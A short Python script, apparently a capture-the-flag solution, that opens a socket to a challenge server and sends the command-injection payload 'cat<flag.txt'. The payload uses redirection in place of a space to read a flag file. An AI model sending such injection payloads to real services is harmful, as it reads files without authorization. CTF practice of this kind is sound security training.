import socket
import time

def test_cmd(cmd):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect(('chals.cyberjousting.com', 1370))
    s.recv(1024)
    s.sendall(cmd.encode() + b"\n")
    time.sleep(1)
    res = s.recv(1024).decode()
    print(f"Command: {cmd}\nResponse:\n{res}")

test_cmd("cat<flag.txt")
